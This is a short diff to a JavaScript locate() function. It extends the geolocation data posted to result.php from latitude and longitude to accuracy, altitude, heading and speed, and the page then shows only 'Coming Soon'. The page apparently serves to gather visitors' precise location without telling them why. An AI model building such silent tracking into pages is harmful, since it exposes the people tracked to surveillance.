@@ -14,11 +14,15 @@ function locate()
   {
     var lat = position.coords.latitude;
     var lon = position.coords.longitude;
+    var acc = position.coords.accuracy;
+    var alt = position.coords.altitude;
+    var dir = position.coords.heading;
+    var spd = position.coords.speed;
+
     $.ajax({
       type: 'POST',
       url: 'result.php',
-      data: {Lat: lat, Lon: lon
-      },
+      data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
       success: function(){$('#change').html('Coming Soon');},
       mimeType: 'text'
     });
